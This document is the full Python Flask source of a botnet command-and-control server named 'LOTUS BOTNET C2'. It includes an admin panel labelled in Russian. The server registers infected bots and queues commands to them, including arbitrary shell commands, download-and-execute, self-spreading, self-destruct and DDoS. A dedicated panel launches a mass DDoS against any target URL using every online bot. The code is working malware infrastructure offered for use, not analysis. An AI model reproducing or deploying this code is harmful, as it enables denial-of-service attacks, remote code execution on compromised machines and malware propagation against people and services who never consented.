import os
import sqlite3
import time
import json
import random
from flask import Flask, request, jsonify

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS bots (
        id TEXT PRIMARY KEY,
        ip TEXT,
        info TEXT,
        status TEXT DEFAULT 'online',
        last_seen INTEGER,
        registered INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        command TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        created INTEGER,
        executed INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        message TEXT,
        timestamp INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def home():
    return 'LOTUS BOTNET C2 - ONLINE'

@app.route('/api/register')
def register():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'ERROR'
    ip = request.remote_addr
    now = int(time.time())
    conn = get_db()
    conn.execute('INSERT OR REPLACE INTO bots (id, ip, last_seen, registered, status) VALUES (?, ?, ?, ?, ?)',
                 (bot_id, ip, now, now, 'online'))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/get')
def get_command():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'none'
    conn = get_db()
    conn.execute('UPDATE bots SET last_seen = ?, status = "online" WHERE id = ?',
                 (int(time.time()), bot_id))
    conn.commit()
    row = conn.execute('SELECT id, command, params FROM commands WHERE bot_id = ? AND status = "pending" LIMIT 1',
                       (bot_id,)).fetchone()
    if row:
        conn.execute('UPDATE commands SET status = "executing", executed = ? WHERE id = ?',
                     (int(time.time()), row['id']))
        conn.commit()
        conn.close()
        return f"{row['command']}:{row['params']}"
    conn.close()
    return 'none'

@app.route('/api/result', methods=['POST'])
def save_result():
    bot_id = request.args.get('id')
    result = request.form.get('result', '')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    row = conn.execute('SELECT id FROM commands WHERE bot_id = ? AND status = "executing" ORDER BY id DESC LIMIT 1',
                       (bot_id,)).fetchone()
    if row:
        conn.execute('UPDATE commands SET status = "done", result = ? WHERE id = ?',
                     (result, row['id']))
        conn.commit()
    conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
                 (bot_id, result, int(time.time())))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/info', methods=['POST'])
def save_info():
    bot_id = request.args.get('id')
    info = request.get_data(as_text=True)
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('UPDATE bots SET info = ? WHERE id = ?', (info, bot_id))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/stats')
def api_stats():
    conn = get_db()
    total = conn.execute('SELECT COUNT(*) FROM bots').fetchone()[0]
    online = conn.execute('SELECT COUNT(*) FROM bots WHERE status = "online" AND last_seen > ?',
                          (int(time.time()) - 600,)).fetchone()[0]
    offline = total - online
    commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
    conn.close()
    return jsonify({'total': total, 'online': online, 'offline': offline, 'commands': commands})

@app.route('/api/bots')
def api_bots():
    conn = get_db()
    rows = conn.execute('SELECT * FROM bots ORDER BY last_seen DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/logs')
def api_logs():
    limit = request.args.get('limit', 100, type=int)
    conn = get_db()
    rows = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    conn = get_db()
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/delete_bot', methods=['POST'])
def api_delete_bot():
    bot_id = request.form.get('id')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE id = ?', (bot_id,))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    bot_id = request.form.get('bot_id')
    command = request.form.get('command')
    params = request.form.get('params', '')
    if not command:
        return 'ERROR'
    conn = get_db()
    if bot_id == 'all':
        rows = conn.execute('SELECT id FROM bots WHERE status = "online"').fetchall()
        for row in rows:
            conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                         (row['id'], command, params, int(time.time())))
    else:
        conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                     (bot_id, command, params, int(time.time())))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/admin')
def admin():
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LOTUS BOTNET C2</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0A0A0F; color: #A0A0B0; font-family: 'Segoe UI', sans-serif; padding: 20px; }
        h1 { color: #fff; font-size: 28px; margin-bottom: 20px; border-bottom: 1px solid #1A1A2E; padding-bottom: 10px; }
        .stats { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
        .stat { background: #14141E; padding: 15px 25px; border-radius: 12px; border: 1px solid #1A1A2E; min-width: 120px; text-align: center; }
        .stat .num { color: #2A7FFF; font-size: 28px; font-weight: 700; }
        .stat .label { color: #666; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .stat .num.online { color: #2ecc71; }
        .stat .num.offline { color: #e74c3c; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; border-bottom: 1px solid #1A1A2E; flex-wrap: wrap; }
        .tab { padding: 10px 20px; cursor: pointer; border-radius: 8px 8px 0 0; transition: 0.3s; background: transparent; color: #666; border: none; font-size: 14px; }
        .tab:hover { color: #fff; background: #14141E; }
        .tab.active { background: #14141E; color: #2A7FFF; border-bottom: 2px solid #2A7FFF; }
        .panel { display: none; background: #14141E; padding: 20px; border-radius: 12px; border: 1px solid #1A1A2E; }
        .panel.active { display: block; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { text-align: left; padding: 10px; border-bottom: 1px solid #1A1A2E; color: #888; }
        td { padding: 10px; border-bottom: 1px solid #0A0A0F; word-break: break-all; }
        .status { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 10px; font-weight: 600; }
        .status.online { background: rgba(46, 204, 113, 0.2); color: #2ecc71; }
        .status.offline { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }
        .cmd-form { display: flex; gap: 10px; flex-wrap: wrap; margin: 10px 0; }
        .cmd-form select, .cmd-form input { background: #0A0A0F; border: 1px solid #1A1A2E; color: #A0A0B0; padding: 10px 15px; border-radius: 8px; font-size: 13px; flex: 1; min-width: 150px; }
        .cmd-form button { background: #2A7FFF; color: #fff; border: none; padding: 10px 25px; border-radius: 8px; cursor: pointer; font-weight: 600; transition: 0.3s; }
        .cmd-form button:hover { background: #3A8FFF; }
        .btn { background: #1A1A2E; color: #A0A0B0; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 11px; transition: 0.3s; }
        .btn:hover { background: #2A2A4E; color: #fff; }
        .btn.danger { background: #8B1A1A; color: #fff; }
        .btn.danger:hover { background: #c0392b; }
        .logs { max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; }
        .logs .log { padding: 3px 0; border-bottom: 1px solid #0A0A0F; }
        .logs .log .time { color: #555; }
        .logs .log .bot { color: #2A7FFF; }
        .ddos-panel { background: #0A0A0F; padding: 15px; border-radius: 8px; border: 1px solid #1A1A2E; margin-top: 15px; }
        @media (max-width: 768px) { .stats { flex-direction: column; } .cmd-form { flex-direction: column; } }
        .id-cell { font-family: monospace; font-size: 11px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; }
    </style>
</head>
<body>
    <h1>🐍 LOTUS BOTNET C2</h1>
    <div class="stats" id="stats">
        <div class="stat"><div class="num" id="total">0</div><div class="label">Всего ботов</div></div>
        <div class="stat"><div class="num online" id="online">0</div><div class="label">Онлайн</div></div>
        <div class="stat"><div class="num offline" id="offline">0</div><div class="label">Оффлайн</div></div>
        <div class="stat"><div class="num" id="commands">0</div><div class="label">Команд в очереди</div></div>
    </div>
    <div class="tabs">
        <button class="tab active" onclick="showPanel('bots')">🤖 Боты</button>
        <button class="tab" onclick="showPanel('commands')">📡 Команды</button>
        <button class="tab" onclick="showPanel('logs')">📋 Логи</button>
        <button class="tab" onclick="showPanel('ddos')">💥 DDoS</button>
    </div>
    <div class="panel active" id="panel-bots">
        <div style="margin-bottom: 10px; display: flex; gap: 10px; flex-wrap: wrap;">
            <button class="btn" onclick="refreshBots()">🔄 Обновить</button>
            <button class="btn danger" onclick="deleteAllBots()">🗑️ Удалить всех</button>
        </div>
        <div style="overflow-x: auto;">
            <table>
                <thead><tr><th>ID</th><th>IP</th><th>Статус</th><th>Последний раз</th><th>Действия</th></tr></thead>
                <tbody id="botsBody"></tbody>
            </table>
        </div>
    </div>
    <div class="panel" id="panel-commands">
        <h3 style="color:#fff; margin-bottom:15px;">📡 Отправить команду</h3>
        <form class="cmd-form" onsubmit="sendCommand(event)">
            <select name="bot_id" id="cmdBotSelect"><option value="all">🌐 ВСЕМ БОТАМ</option></select>
            <select name="command" id="cmdType">
                <option value="ddos">💥 DDoS</option>
                <option value="cmd">💻 CMD</option>
                <option value="download">📥 Скачать и запустить</option>
                <option value="update">🔄 Обновиться</option>
                <option value="selfdestruct">💀 Самоуничтожение</option>
                <option value="spread">📀 Распространиться</option>
                <option value="info">📊 Информация</option>
            </select>
            <input type="text" id="cmdParams" placeholder="Параметры (URL, команда, цель)">
            <button type="submit">▶ Отправить</button>
        </form>
        <h3 style="color:#fff; margin:20px 0 10px;">📋 История команд</h3>
        <div style="overflow-x:auto;"><table><thead><tr><th>Бот</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead><tbody id="commandsBody"></tbody></table></div>
    </div>
    <div class="panel" id="panel-logs">
        <div style="margin-bottom: 10px; display: flex; gap: 10px;">
            <button class="btn" onclick="refreshLogs()">🔄 Обновить</button>
            <button class="btn danger" onclick="clearLogs()">🗑️ Очистить</button>
        </div>
        <div class="logs" id="logsContainer"></div>
    </div>
    <div class="panel" id="panel-ddos">
        <h3 style="color:#fff; margin-bottom:15px;">💥 МАССОВАЯ DDoS АТАКА</h3>
        <form class="cmd-form" onsubmit="startDDoS(event)">
            <input type="text" id="ddosTarget" placeholder="https://target.com" style="flex:2; min-width:300px;">
            <button type="submit" style="background:#c0392b;">🔥 ЗАПУСТИТЬ DDoS</button>
        </form>
        <div class="ddos-panel">
            <p style="color:#666; font-size:12px;">💡 Атака начнется через 5-15 секунд на всех подключенных ботах</p>
            <p style="color:#666; font-size:12px;">📊 Ботов в атаке: <span id="ddosCount">0</span></p>
        </div>
    </div>
    <script>
        function showPanel(name) {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.getElementById('panel-' + name).classList.add('active');
            document.querySelector(`.tab[onclick*="${name}"]`).classList.add('active');
            if (name === 'bots') refreshBots();
            if (name === 'logs') refreshLogs();
        }
        async function refreshStats() {
            try {
                const r = await fetch('/api/stats');
                const data = await r.json();
                document.getElementById('total').textContent = data.total || 0;
                document.getElementById('online').textContent = data.online || 0;
                document.getElementById('offline').textContent = data.offline || 0;
                document.getElementById('commands').textContent = data.commands || 0;
                document.getElementById('ddosCount').textContent = data.online || 0;
            } catch {}
        }
        async function refreshBots() {
            try {
                const r = await fetch('/api/bots');
                const data = await r.json();
                const tbody = document.getElementById('botsBody');
                const select = document.getElementById('cmdBotSelect');
                select.innerHTML = '<option value="all">🌐 ВСЕМ БОТАМ</option>';
                tbody.innerHTML = '';
                data.forEach(bot => {
                    const statusClass = bot.status === 'online' ? 'online' : 'offline';
                    const lastSeen = bot.last_seen ? new Date(bot.last_seen * 1000).toLocaleString() : 'Никогда';
                    const ip = bot.ip || 'N/A';
                    const tr = document.createElement('tr');
                    tr.innerHTML = `<td class="id-cell">${bot.id}</td><td>${ip}</td><td><span class="status ${statusClass}">${bot.status}</span></td><td>${lastSeen}</td><td><button class="btn" onclick="sendQuickCommand('${bot.id}','info','')">📊</button><button class="btn danger" onclick="deleteBot('${bot.id}')">🗑️</button></td>`;
                    tbody.appendChild(tr);
                    const opt = document.createElement('option');
                    opt.value = bot.id;
                    opt.textContent = bot.id + ' (' + ip + ')';
                    select.appendChild(opt);
                });
                refreshStats();
            } catch {}
        }
        async function refreshLogs() {
            try {
                const r = await fetch('/api/logs?limit=100');
                const data = await r.json();
                const container = document.getElementById('logsContainer');
                container.innerHTML = '';
                data.forEach(log => {
                    const div = document.createElement('div');
                    div.className = 'log';
                    const time = new Date(log.timestamp * 1000).toLocaleTimeString();
                    div.innerHTML = `<span class="time">[${time}]</span> <span class="bot">${log.bot_id}</span> <span class="msg">${log.message}</span>`;
                    container.appendChild(div);
                });
            } catch {}
        }
        async function sendCommand(e) {
            e.preventDefault();
            const botId = document.getElementById('cmdBotSelect').value;
            const command = document.getElementById('cmdType').value;
            const params = document.getElementById('cmdParams').value;
            const formData = new FormData();
            formData.append('bot_id', botId);
            formData.append('command', command);
            formData.append('params', params);
            await fetch('/api/send_command', { method: 'POST', body: formData });
            document.getElementById('cmdParams').value = '';
            refreshStats();
        }
        async function sendQuickCommand(botId, command, params) {
            const formData = new FormData();
            formData.append('bot_id', botId);
            formData.append('command', command);
            formData.append('params', params);
            await fetch('/api/send_command', { method: 'POST', body: formData });
            refreshStats();
        }
        async function startDDoS(e) {
            e.preventDefault();
            const target = document.getElementById('ddosTarget').value;
            if (!target) return;
            const formData = new FormData();
            formData.append('bot_id', 'all');
            formData.append('command', 'ddos');
            formData.append('params', target);
            await fetch('/api/send_command', { method: 'POST', body: formData });
            document.getElementById('ddosTarget').value = '';
            refreshStats();
            alert('🔥 DDoS атака запущена на ' + target);
        }
        async function deleteBot(id) {
            if (!confirm('Удалить бота ' + id + '?')) return;
            const formData = new FormData();
            formData.append('id', id);
            await fetch('/api/delete_bot', { method: 'POST', body: formData });
            refreshBots();
        }
        async function deleteAllBots() {
            if (!confirm('Удалить ВСЕХ ботов?')) return;
            const data = await (await fetch('/api/bots')).json();
            for (const bot of data) {
                const fd = new FormData();
                fd.append('id', bot.id);
                await fetch('/api/delete_bot', { method: 'POST', body: fd });
            }
            refreshBots();
        }
        async function clearLogs() {
            if (!confirm('Очистить логи?')) return;
            await fetch('/api/clear_logs', { method: 'POST' });
            refreshLogs();
        }
        setInterval(refreshStats, 10000);
        setInterval(refreshBots, 30000);
        refreshStats();
        refreshBots();
        refreshLogs();
    </script>
</body>
</html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
